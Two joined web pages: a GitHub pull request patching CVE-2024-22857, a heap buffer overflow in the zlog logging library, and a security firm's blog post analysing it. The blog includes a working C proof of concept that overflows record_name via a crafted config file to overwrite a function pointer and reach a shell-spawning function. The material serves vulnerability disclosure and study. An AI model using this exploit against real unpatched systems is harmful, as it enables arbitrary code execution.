* [Notifications](/login?return_to=%2FHardySimpson%2Fzlog) You must be signed in to change notification settings
* [Fork
  725](/login?return_to=%2FHardySimpson%2Fzlog)
* [Star
   2.3k](/login?return_to=%2FHardySimpson%2Fzlog)

* [Code](/HardySimpson/zlog)
* [Issues
  121](/HardySimpson/zlog/issues)
* [Pull requests
  7](/HardySimpson/zlog/pulls)
* [Actions](/HardySimpson/zlog/actions)
* [Projects
  0](/HardySimpson/zlog/projects)
* [Wiki](/HardySimpson/zlog/wiki)
* [Security](/HardySimpson/zlog/security)
* [Insights](/HardySimpson/zlog/pulse)

Additional navigation options

* [Code](/HardySimpson/zlog)
* [Issues](/HardySimpson/zlog/issues)
* [Pull requests](/HardySimpson/zlog/pulls)
* [Actions](/HardySimpson/zlog/actions)
* [Projects](/HardySimpson/zlog/projects)
* [Wiki](/HardySimpson/zlog/wiki)
* [Security](/HardySimpson/zlog/security)
* [Insights](/HardySimpson/zlog/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FHardySimpson%2Fzlog%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FHardySimpson%2Fzlog%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# CVE-2024-22857: buffer overflow patched #251

 Merged

[deemar](/deemar)
merged 1 commit into
[HardySimpson:master](/HardySimpson/zlog/tree/master "HardySimpson/zlog:master")
from
[locus-x64:alirazamumtaz](/locus-x64/zlog/tree/alirazamumtaz "locus-x64/zlog:alirazamumtaz")

Feb 29, 2024

 Merged

# [CVE-2024-22857: buffer overflow patched](#top) #251

[deemar](/deemar)
merged 1 commit into
[HardySimpson:master](/HardySimpson/zlog/tree/master "HardySimpson/zlog:master")
from
[locus-x64:alirazamumtaz](/locus-x64/zlog/tree/alirazamumtaz "locus-x64/zlog:alirazamumtaz")

Feb 29, 2024

[Conversation
0](/HardySimpson/zlog/pull/251)
[Commits
1](/HardySimpson/zlog/pull/251/commits)
[Checks
0](/HardySimpson/zlog/pull/251/checks)
[Files changed](/HardySimpson/zlog/pull/251/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![locus-x64](https://avatars.githubusercontent.com/u/70605579?s=60&v=4)](/locus-x64)

Copy link

Contributor

### @locus-x64 **[locus-x64](/locus-x64)** commented [Feb 29, 2024](#issue-2160500259)

Size of `record_name` is **`MAXLEN_PATH(1024) + 1`** but `file_path` may have data upto **`MAXLEN_CFG_LINE(MAXLEN_PATH*4) + 1`**. So a check was missing in `zlog_rule_new()` while copying the `record_name` from `file_path + 1` which caused the buffer overflow. An attacker can exploit this vulnerability to overwrite the `zlog_record_fn record_func` function pointer to get arbitrary code execution.

Sorry, something went wrong.

All reactions

[![@locus-x64](https://avatars.githubusercontent.com/u/70605579?s=40&v=4)](/locus-x64)

`[buffer overflow patched](/HardySimpson/zlog/pull/251/commits/77d8af3b368b564605f3ab34ad9b0ed6ead9b380 "buffer overflow patched")`

`[77d8af3](/HardySimpson/zlog/pull/251/commits/77d8af3b368b564605f3ab34ad9b0ed6ead9b380)`

[![@deemar](https://avatars.githubusercontent.com/u/5099702?s=40&v=4)](/deemar)
[deemar](/deemar)
merged commit [`c47f781`](/HardySimpson/zlog/commit/c47f781a9f1e9604f5201e27d046d925d0d48ac4)
into
HardySimpson:master

[Feb 29, 2024](https://github.com/HardySimpson/zlog/pull/251#event-11961351432)

[![@locus-x64](https://avatars.githubusercontent.com/u/70605579?s=40&u=efdb25ee26dc16e49bc4a70fd8bb7c5e265771ec&v=4)](/locus-x64)
[locus-x64](/locus-x64)
mentioned this pull request
[Feb 29, 2024](#ref-issue-2141995699)

[Severe Vulnerability in zlog 1.2.17
#250](/HardySimpson/zlog/issues/250)

Closed

[![@LeSuisse](https://avatars.githubusercontent.com/u/737767?s=40&v=4)](/LeSuisse)
[LeSuisse](/LeSuisse)
mentioned this pull request
[Mar 1, 2024](#ref-pullrequest-2163100970)

[zlog: apply patch for CVE-2024-22857
NixOS/nixpkgs#292517](/NixOS/nixpkgs/pull/292517)
 Merged

13 tasks

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FHardySimpson%2Fzlog%2Fpull%2F251)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@locus-x64](https://avatars.githubusercontent.com/u/70605579?s=52&v=4)](/locus-x64) [![@deemar](https://avatars.githubusercontent.com/u/5099702?s=52&v=4)](/deemar)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.ebryx.com_6849477b_20250111_100017.html ===
[![ebryx-header-logo](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/6551c7fab4817bf297234a6f_Logo%20Red.png)![ebryx-mobile-logo](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/64f889e4b5ada33a10b2b79e_Group%201000003284.png)](/)Services
## [Security Consultion Services](/cyber-security-assessment-services)

[Zero Trust Architecture](/zta-assessment)
## [Application Security](/application-security)

[Compromise Assessment](/compromise-assessment)[DevSecOps](/devsec-ops-services)[Cybersecurity Staff Augmentation](/cybersecurity-staff-augmentation)[Penetration Testing](/penetration-testing)[Cloud Security](/cloud-security-services)
## [Security R&D](/cyber-security-threat-research-development-testing)

[Malware Threat Research](/malware-threat-research)[Security Product Testing](/security-product-testing)[Security Product Engineering](/security-product-engineering)
## [Detection and Response Services](/detection-response-services)

[Managed SOC](/managed-soc)[Incident Response](/cyber-incident-readiness-response)
## [Virtual Chief Information Security Officer (vCISO)](/vciso-service)

## [Security GRC Services](/governance-risk-and-compliance)

## [All-In-One Cyber Security](/all-in-one-cybersecurity)

## [Zero Trust](https://www.invisily.com)

[VPN Replacement](https://www.invisily.com/vpn-replacement)[Micro-Segmentation](https://www.invisily.com/micro-segmentation)[Digital Asset Protection](https://www.invisily.com/use-cases/digital-asset-protection)[NAC Alternative](https://www.invisily.com/use-cases/nac-alternative)[Secure Access to Internet](https://www.invisily.com/secure-access-to-internet-cloud-and-saas)[Third-party Access](https://www.invisily.com/agent-based-and-agentless-access)SolutionsSolutions

[Security for Startups](/security-for-startups)

[Essential Cyber Hygiene](/essential-cyber-hygiene)

[ZTNA](https://www.invisily.com/)[VPN Replacement](https://www.invisily.com/vpn-replacement)[Secure Access to Enterprise
Application](https://www.invisily.com/enterprise-applications)[VPN Replacement](https://www.invisily.com/vpn-replacement)[Secure Access to Enterprise
Application](https://www.invisily.com/secure-thrid-party-access)[Micro-Segmentation](https://www.invisily.com/micro-segmentation)[NAC Alternatives](https://www.invisily.com/nac-alternative)[Secure Cloud Access](https://www.invisily.com/secure-access-to-internet-cloud-and-saas)Our CompanyOur Company[About Us](/about-us)

[Careers](/careers)

[VPN Replacement](https://www.invisily.com/vpn-replacement)[Secure Access to Enterprise
Application](https://www.invisily.com/enterprise-applications)ResourcesResources

[Case Studies](/case-study)

[Blogs](/blogs)[E-Book Essential
Cyber Hygiene](/e-book-essential-cyber-hygiene)[VPN Replacement](https://www.invisily.com/vpn-replacement)[Secure Access to Enterprise
Application](https://www.invisily.com/enterprise-applications)[Contact Us](/contact-us)[News and Updates](/news-and-update)
# **Arbitrary Code Execution in ZLOG (CVE-2024-22857): Unveiling the Vulnerability**

![Arbitrary Code Execution in ZLOG (CVE-2024-22857): Unveiling the Vulnerability](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/65e847fd23b8160519f82bdf_Featured%20Image%20for%20Articles.png)![Ebryx - Images](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/6511944c5b752a8907bba4f0_Ellipse%2039.png)**Posted by** Editorial StaffContents[Introduction](#1)[zlog: A Primer](#2)[The Vulnerability Explained](#TheVulnerabilityExplained)[Code Execution](#CodeExecution)[Proof of Concept](#ProofofConcept)[Conclusion](#Conclusion)
## **Introduction**

CVE-2024-22857 refers to a heap-based buffer overflow vulnerability found in the zlog library version 1.2.16. This vulnerability arises when creating a new rule that is already defined in the provided configuration file, allowing a regular user to potentially achieve arbitrary code execution.

Our researchers Faran Abdullah and Ali Raza uncovered this critical flaw, highlighting that it could enable attackers to remotely execute arbitrary code on systems using the affected library versions. The issue originates from the zlog\_rule\_new() function, which does not adequately check the length of user-defined strings before copying them, leading to the buffer overflow. Due to Zlog's widespread use for its high performance and flexible logging capabilities, the impact of CVE-2024-22857 could be significant, affecting a broad range of software applications.

This CVE is marked as high risk with a CVSS score of 8.5 and is one of the top 5 trending CVEs worldwide.

![Arbitrary Code Execution in ZLOG (CVE-2024-22857): Unveiling the Vulnerability](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/66015495d1beb47e0cfc65a9_remote%20code%20execution-min.jpg)![Arbitrary Code Execution in ZLOG (CVE-2024-22857): Unveiling the Vulnerability](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/6601544b8bf0f643329ec528_cve%20trend.jpg)

Dive into the complete analysis in our blog, which covers the discovery, technical breakdown, and a proof of concept demonstrating how this vulnerability can be exploited.

## **Zlog: A Primer**

Zlog, renowned for its thread-safe and high-performance logging capabilities, allows for extensive customization through user-defined configuration files. This customization enables developers to specify various aspects of logging, including global configurations, application levels, log patterns, and rules for log entry categorization and output. The simplicity and flexibility of zlog make it an attractive option for developers looking for an efficient way to implement logging in their applications. A typical example of zlog's usage involves defining formats and rules within a configuration file, which then guides the library on how to process and output log messages, as demonstrated below:

```
// Config file

[formats]

simple = "%m%n"

[rules]

mycat.INFO >stdout; simple

// Driver program

int main(){

const char * config_file = "zlog.conf";

zlog_init(config_file);

zlog_category_t *zc;

zlog_get_category("mycat");

zlog_info(c, "Hello, zlog");

zlog_fini();

return 0;

}
```

This will display the log on stdout as defined in the configuration file. zlog supports various output methods. The syntax is:

(output action), (output option); (format name, optional).

The output option of our interest is user-defined output defined as:

```
mycat.* $my_func, "~/zlog_out.txt"; simple

and the corresponding usage is as:

int in_program_func(zlog_msg_t *msg){

// Do whatever you want to, with the output

}

int main(void){

  // .....

// set in_program_func as output function

zlog_set_record("my_func", in_program_func);

// .....

}
```
### **The Vulnerability Explained**

The crux of CVE-2024-22857 lies within the zlog\_rule\_new() function, which is responsible for parsing user-defined rules in the configuration file and initializing corresponding zlog structures. During this process, the function does not adequately check the length of user-supplied strings before copying them into fixed-size buffers. This oversight can be exploited to overflow the buffer, potentially leading to arbitrary code execution.
â
When zlog\_init() is called, all rules will be read into memory. We have a struct zlog\_rule\_t (a typedef to struct zlog\_rule\_s) object in the zlog which holds the data of each rule. Whereas each line in the [rule] section defines a separate rule.
â

```
#define MAXLEN_PATH 1024
#define MAXLEN_CFG_LINE (MAXLEN_PATH * 4)

typedef struct zlog_rule_s zlog_rule_t;
typedef int (*zlog_rule_output_fn) (zlog_rule_t * a_rule, zlog_thread_t * a_thread);

struct zlog_rule_s {
	char category[MAXLEN_CFG_LINE + 1];
	char compare_char;
	int level;
	unsigned char level_bitmap[32]; /* for category determine whether output or not */
	unsigned int file_perms;
	int file_open_flags;
	char file_path[MAXLEN_PATH + 1];
	zc_arraylist_t *dynamic_specs;
	int static_fd;
	dev_t static_dev;
	ino_t static_ino;
	long archive_max_size;
	int archive_max_count;
	char archive_path[MAXLEN_PATH + 1];
	zc_arraylist_t *archive_specs;
	FILE *pipe_fp;
	int pipe_fd;
	size_t fsync_period;
	size_t fsync_count;
	zc_arraylist_t *levels;
	int syslog_facility;
	zlog_format_t *format;
	zlog_rule_output_fn output;
	char record_name[MAXLEN_PATH + 1];
	char record_path[MAXLEN_PATH + 1];
	zlog_record_fn record_func;
};
```

When we call zlog\_init(), each line of the config file will be parsed as shown in the backtrace

```
-> int zlog_init(const char *config)
-> static int zlog_init_inner(const char *config)
-> zlog_conf_t *zlog_conf_new(const char *config)
-> static int zlog_conf_build_with_file(zlog_conf_t * a_conf)
-> static int zlog_conf_parse_line(zlog_conf_t * a_conf, char *line, int *section) // line[MAXLEN_CFG_LINE + 1];
-> zlog_rule_t *zlog_rule_new( char * line,
							zc_arraylist_t * levels,
							zlog_format_t * default_format,
							zc_arraylist_t * formats,
							unsigned int file_perms,
							size_t fsync_period,
							int * time_cache_count);
	// Inside this function
	case '$' :
	sscanf(file_path + 1, "%s", a_rule->record_name);

```

By crafting a malicious configuration file that includes an overly long string for a user-defined output, an attacker can overflow the record\_name buffer, corrupt adjacent memory, and manipulate the control flow of the application to execute arbitrary code.

Inside the zlog\_conf\_parse\_line() function, there is a char\* line pointer pointing to the following line in the configuration file:

```
mycat.* $my_func, "~/zlog_out.txt"; simple

Then it calls the zlog_rule_new() function. This function parses the line and initializes the related properties.
/*
* line [mycat.* $my_func, "~/zlog_out.txt"; simple]

* selector [mycat.*] // seperated by space

* *action [$my_func, "~/zlog_out.txt"; simple]

*/

/*
* selector [mycat.*]
* category [mycat] // terminated by.
* level [*]
*/

/*
* action [$my_func, "~/zlog_out.txt"; simple]
* output [$my_func, "~/zlog_out.txt"] // terminated by ;
* format [$my_func, "~/zlog_out.txt"; simple]
*/

/*
* output [$my_func, "~/zlog_out.txt"]
* file_path [$my_func] [>syslog ]
* *file_limit ["~/zlog_out.txt"]
*/
```

We have file\_path having the "$my\_func" string. Now it will copy the whole string after the $ sign till the end of the string into a\_rule->record\_name.
â
There is no size check limit for the string copied into the record\_name (The size of file\_path is 4097 while the size of record\_name is 1025). For instance, if we have the rule line as:
mycat.\* $AAAA... up to the end of line limit (MAXLEN\_CFG\_LINE)

### **Code Execution**

As mentioned above, we can overflow the record\_name buffer, we have a function pointer named record\_func adjacent to it. So Â we can overwrite the record\_func function pointer. L, let's explore how it can be invoked. To place a log entry of any level, we use a set of functions as zlog\_<level>() which are just a typedef to zlog() function. Look at the trace given below when we call zlog\_info() for the **info** level:

```
#define zlog_info(cat, ...) \\
	zlog(cat, __FILE__, sizeof(__FILE__)-1, __func__, sizeof(__func__)-1, __LINE__, \\
	ZLOG_LEVEL_INFO, __VA_ARGS__)

-> void zlog(zlog_category_t * category,
		  const char *file, size_t filelen,
		  const char *func, size_t funclen,
		  long line, const int level, const char *format, ...)
-> int zlog_category_output(zlog_category_t * a_category, zlog_thread_t * a_thread)
-> int zlog_rule_output(zlog_rule_t * a_rule, zlog_thread_t * a_thread)
	-> a_rule->output(a_rule, a_thread);

-> static int zlog_rule_output_static_record(zlog_rule_t * a_rule, zlog_thread_t * a_thread);
	-> if (a_rule->record_func(&msg))

```

Inside zlog\_rule\_output(), it checks the level, and then accordingly calls the a\_rule->output() which is the record\_funca function pointer set at initialization to zlog\_rule\_output\_static\_record(). And this function will invoke the record\_func function pointer that has been replaced with the malicious part of code using the overflow.

### **Proof of Concept**

The severity of this vulnerability is underscored by a proof of concept that demonstrates how a crafted configuration file can be used to trigger the buffer overflow and potentially execute arbitrary code. By exploiting the vulnerability, it's possible to redirect the execution flow of an application using zlog to malicious code defined by an attacker, as demonstrated in the following example:

```
// Compile: gcc poc.c -o poc - âlzlog

// Author: Ali Raza

#include <stdio.h>

#include <string.h>

#include <stdlib.h>

#include "../zlog/src/zlog.h"

const char const * buggy_config_file = "buggy_zlog.conf";

const char const * config_str = "[formats]\n"

                                "simple = \"\%m\%n\"\n"

                                "[rules]\n"

                                "mycat.* $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

                                "yjUUUU  \n"; // <TO BE CHANGED> This is the address (of course in ASCII) where We want to redirect the execution flow

void spawn_shell(void){

    puts("[+]Spawning shell");

    system("/bin/sh");

}

int main(void){

    // create the buggy config file

    puts("[*]Creating the buggy config file");

    FILE *fp = fopen(buggy_config_file, "w");

    fwrite(config_str, 1, strlen(config_str), fp);

    fclose(fp);

    puts("[+]File created and the content is written");

    // init zlog with the buggy config file

    puts("[*]Initializing zlog with the buggy config file");

    int rc = zlog_init(buggy_config_file);

    if (rc){

        printf("init failed\\\\n");

        return -1;

    }

    zlog_category_t *zc;

    zc = zlog_get_category("mycat");

    if (!zc){

        printf("get cat fail\n");

        zlog_fini();

        return -2;

    }

    puts("[+]zlog initialized successfully and category is created");

    puts("[*]Now logging any message to trigger the vulnerability");

    zlog_info(zc, "My first Log Message");

    zlog_fini();

    return 0;

}
```
![Arbitrary Code Execution in ZLOG (CVE-2024-22857): Unveiling the Vulnerability](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/65e84d0778d83fdd91d9e00b_Untitled.png)
### Conclusion

The discovery of CVE-2024-22857 within the zlog library serves as a poignant reminder of the importance of thorough security testing and validation in the development lifecycle of software. At Ebryx, our commitment to ensuring the security and integrity of our products is paramount. Through proactive vulnerability discovery and remediation, we strive to uphold the highest standards of security for our clients and the broader software community. The identification and reporting of such vulnerabilities not only contribute to the security of our products but also secures the ecosystem at large, making it more resilient against threats.

### References

<https://github.com/HardySimpson/zlog><https://hardysimpson.github.io/zlog/UsersGuide-EN.html>patch: 77d8af3b368b564605f3ab34ad9b0ed6ead9b380
### Credits

Bug discovered by Faran Abdullah

Bug exploited by Ali RazaShare the article with your friendsïï¡ï
##### Related Posts

![Organized ATM Jackpotting](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/6512b95c910e3c827b7d52c0_Rectangle%20138.png)[Blog](/organized-atm-jackpotting)[Organized ATM Jackpotting](/organized-atm-jackpotting)Ebryx forensic analysts identified an organized criminal group in the South-Asian region. The group utilized an ATM malware to dispense cash directly from the ATM tray.May 22, 2023 3 Min Readï¸![Cyberattacks on the Rise: 2022 Mid-Year Rport](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/651e74067c9425b85475d53d_627c36317a364-300x207.jpg)[Blog](/cyberattacks-on-the-rise)[Cyberattacks on the Rise: 2022 Mid-Year Rport](/cyberattacks-on-the-rise)Cyber attacks are on the rise in 2022. Despite increased cybersecurity awareness, businesses have not been able to defend themselves from the rapidly changing threat landscape. Compared with the sameMay 22, 2023 3 Min Readï¸![How To Land Your First Cybersecurity Job: 5 Tips](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/651e7415a20c548195736f98_Axis.com_-300x120.jpg)[Blog](/how-to-land-your-first-cybersecurity-job-5-tips)[How To Land Your First Cybersecurity Job: 5 Tips](/how-to-land-your-first-cybersecurity-job-5-tips)Cybersecurity jobs are growing at a staggering rate and have shown no signs of stopping. According to the New York Times, an estimated 3.5 million cybersecurity positions remain unfilled globally.May 22, 2023 3 Min Readï¸
##### Steer Clear of Threats and Mitigate Vulnerabilities with our Zero Trust Solutions

###### Zero Trust Architecture Assessment

###### Implement Universal ZTNA Solution

###### Adopt Zero Trust with Confidence

###### Start Your Zero Trust Journey

[Contact us](/contact-us)ï Phone:
**+1 603-912-5385**ï EMAIL:
**info@ebryx.com**
###### Get in Touch

Have any questions or queries?
![ebryx-logo-footer](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/64f88b0ab5ada33a10b3f201_Group%201000003286.png)

GET IN TOUCH

info@ebryx.com+1 603-912-5385

ADDRESS

389 Main Street,
Unit 5 Salem, NH 03079

SERVICES

[Managed SOC Services](/managed-soc)[Penetration Testing Services](/penetration-testing)[Security R&D](/cyber-security-threat-research-development-testing)[Application Security](/application-security)[Cybersecurity Staff
Augmentation](/cybersecurity-staff-augmentation)[Security GRC Services](/governance-risk-and-compliance)

SOLUTIONS

[Essential Cyber Hygiene](/essential-cyber-hygiene)[ZTNA](https://www.invisily.com/)[VPN Replacement](https://www.invisily.com/vpn-replacement)[Secure Access to Enterprise Applications](https://www.invisily.com/enterprise-applications)[Micro-Segmentation](https://www.invisily.com/micro-segmentation)NAC AlternativesSecure Cloud AccessResources[Case Studies](/case-study)Data SheetsSlide Decks[Blogs](/blogs)

CONNECT WITH US

[Contact](/contact-us)[Careers](/careers)![cmmi-logo-footer](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/65c1e792a0a0c5f27cefb369_cmmi-level-3-seeklogo.jpg)![iso-footer-logo](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/65c1eafa9899b6ff2d91c9ea_image_2-removebg-preview.png)

FOLLOW US ON SOCIALS

[ï¡](https://www.linkedin.com/company/ebryxllc/)[î](https://twitter.com/EBRYX)[ï](https://www.facebook.com/EbryxLLC/)Â© Ebryx Â  Â  Â  Â  Â  Â [Cookie Policy](https://webflow.ebryx.com/cookie-policy) Â  Â  Â  Â  Â  | Â  [Privacy Policy](https://webflow.ebryx.com/privacy-policy)[| Â Â Â Information Security Policy](/information-security-policy)![ebryx-logo-footer-mobile](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/64f88b0ab5ada33a10b3f201_Group%201000003286.png)

GET IN TOUCH!

EMAIL

info@ebryx.com

CUSTOMER SUPPORT

+1 603-912-5385

ADDRESS

389 Main Street, Unit 5
Salem, NH 03079

Services

[Managed SOC Services](/managed-soc)[Penetration Testing Services](/penetration-testing)[Security R&D](/cyber-security-threat-research-development-testing)[Application Security](/application-security)[Cybersecurity Staff Augmentation](/cybersecurity-staff-augmentation)[Security GRC Services](/governance-risk-and-compliance)

Solutions

[Essential Cyber Hygiene](/essential-cyber-hygiene)[ZTNA](https://www.invisily.com/)[VPN Replacement](https://www.invisily.com/vpn-replacement)[Secure Access to Enterprise Applications](https://www.invisily.com/enterprise-applications)[Micro-Segmentation](https://www.invisily.com/micro-segmentation)NAC AlternativesSecure Cloud Access

Resources

[Case Studies](/case-study)Data SheetsSlide Decks[Blogs](/blogs)

Connect With Us

[Contact](/contact-us)[Careers](/careers)![cmmi-logo-mobile-footer](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/65c1e792a0a0c5f27cefb369_cmmi-level-3-seeklogo.jpg)![iso-logo-mobile-footer](https://cdn.prod.website-files.com/64f8855d0904eb4347e8ae9f/65c1eafa9899b6ff2d91c9ea_image_2-removebg-preview.png)

Follow Us On Socials

[ï¡](https://www.linkedin.com/company/ebryxllc/)[î](https://twitter.com/EBRYX)[ï](https://www.facebook.com/EbryxLLC/)Â© Ebryx Â  Â  Â  Â  Â  Â Cookie Policy Â  Â  Â  Â  Â
Privacy Policy


